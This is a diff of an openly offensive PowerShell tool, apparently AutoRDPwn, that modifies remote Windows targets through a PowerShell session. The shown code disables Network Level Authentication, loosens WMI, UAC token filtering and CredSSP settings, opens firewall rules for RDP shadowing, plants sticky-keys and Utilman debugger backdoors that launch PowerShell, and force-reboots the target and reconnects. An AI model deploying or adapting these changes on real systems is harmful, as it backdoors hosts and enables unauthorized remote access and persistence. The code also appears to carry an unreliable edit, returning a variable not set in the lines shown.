@@ -603,7 +603,7 @@ function Remove-Exclusions {
 
         if(!$control) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 600 }} until ($control)
 
-    invoke-command -session $RDP[0] -scriptblock {
+    $prevAllowRPC = invoke-command -session $RDP[0] -scriptblock {
     $AllowAnonymousCallback = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\WBEM\CIMOM").AllowAnonymousCallback
     New-ItemProperty "HKLM:\SOFTWARE\Microsoft\WBEM\CIMOM" -Name AllowAnonymousCallback -Value 1 -PropertyType DWORD -Force 2>&1> $null
     $DisableRestrictedAdmin = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa").DisableRestrictedAdmin
@@ -625,7 +625,10 @@ function Remove-Exclusions {
     $UserAuthentication = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp").UserAuthentication
     New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name UserAuthentication -Value 0 -PropertyType DWORD -Force 2>&1> $null
     $LocalAccountTokenFilterPolicy = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").LocalAccountTokenFilterPolicy
-    New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -Value 1 -PropertyType DWORD -Force 2>&1> $null }
+    New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -Value 1 -PropertyType DWORD -Force 2>&1> $null
+    Enable-NetFirewallRule -Name 'RemoteDesktop-Shadow-In-TCP' 2>&1> $null
+    if(!(Get-NetFirewallRule -Name 'AutoRDPwn-TermService-RPC-In')) { New-NetFirewallRule -Name 'AutoRDPwn-TermService-RPC-In' -DisplayName 'AutoRDPwn TermService RPC' -Direction Inbound -Action Allow -Program 'C:\Windows\System32\svchost.exe' -Service TermService -Protocol TCP -Profile Any 2>&1> $null }
+    $AllowRemoteRPC }
     $AllowEncryptionOracle = (Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters").AllowEncryptionOracle
     New-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters" -Name AllowEncryptionOracle -Value 2 -PropertyType DWORD -Force 2>&1> $null
 
@@ -648,6 +651,10 @@ function Remove-Exclusions {
     New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" -Name Debugger -Value "powershell.exe -noexit ; clear" -PropertyType String -Force 2>&1> $null
     New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Utilman.exe" -Name Debugger -Value "powershell.exe -noexit ; clear" -PropertyType String -Force 2>&1> $null
     New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name LogonTimeout -Value 3600 -PropertyType DWord -Force 2>&1> $null }}
+
+    if(!$prevAllowRPC){ Write-Host ; Write-Host "[i] $txt86" -ForegroundColor Green ; Start-Sleep -milliseconds 600
+    invoke-command -session $RDP[0] -scriptblock { Restart-Computer -Force } 2>&1> $null ; Start-Sleep -seconds 60
+    $j = 0 ; do { $j++ ; Start-Sleep -milliseconds 3000 ; if($user){ $RDP = New-PSSession -Computer $computer -credential $credential -Authentication Negotiate 2>&1> $null } else { $RDP = New-PSSession -Computer $computer -Authentication Negotiate 2>&1> $null } } until ($RDP -or $j -eq 30) }}
 
         if($version -Like '*Server*') { Write-Host "[!] $version $txt37" -ForegroundColor Red ; if(!$sticky) { invoke-command -session $RDP[0] -scriptblock { $Host.UI.RawUI.ForegroundColor = 'Green'
         (Get-CimInstance -ClassName Win32_TSGeneralSetting -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0) 2>&1> $null
